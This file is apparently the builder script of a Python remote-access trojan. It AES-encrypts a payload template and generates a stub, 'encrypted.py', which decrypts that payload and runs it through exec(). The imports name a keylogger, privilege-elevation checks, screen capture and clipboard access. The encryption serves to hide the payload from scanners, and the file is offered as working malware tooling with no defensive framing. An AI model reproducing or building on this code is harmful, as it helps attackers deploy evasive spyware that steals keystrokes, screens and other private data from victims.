import socket
import json
import subprocess
import ctypes
import os
import keylogger
import threading
import shutil
import sys
import base64
from elevated import elevatedcheck
from weakcheck import *
from getinfo import *
from config import *
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad ,unpad
from cryptography.fernet import Fernet
from PIL import ImageGrab, Image
from io import BytesIO
import win32clipboard
from template import *
from Crypto.Random import get_random_bytes

key = get_random_bytes(32)
iv = os.urandom(16)

def encrypt(message, iv,  key):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    padded = pad(message.encode("utf-8"), AES.block_size)
    encrypted = cipher.encrypt(padded)
    return base64.b64encode(encrypted)

encrypted = encrypt(template, iv, key)

with open("encrypted.py", "w") as f:
    f.write(f"""
import socket
import json
import subprocess
import ctypes
import os
import keylogger
import threading
import shutil
import sys
import base64
from elevated import elevatedcheck
from weakcheck import *
from getinfo import *
from config import *
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad ,unpad
from cryptography.fernet import Fernet
from PIL import ImageGrab, Image
from io import BytesIO
import win32clipboard

encrypted = {encrypted}
cipher = AES.new({key}, AES.MODE_CBC, {iv})
message = cipher.decrypt(base64.b64decode(encrypted))
unpadded = unpad(message, AES.block_size)
exec(unpadded)
    """)
    f.close()

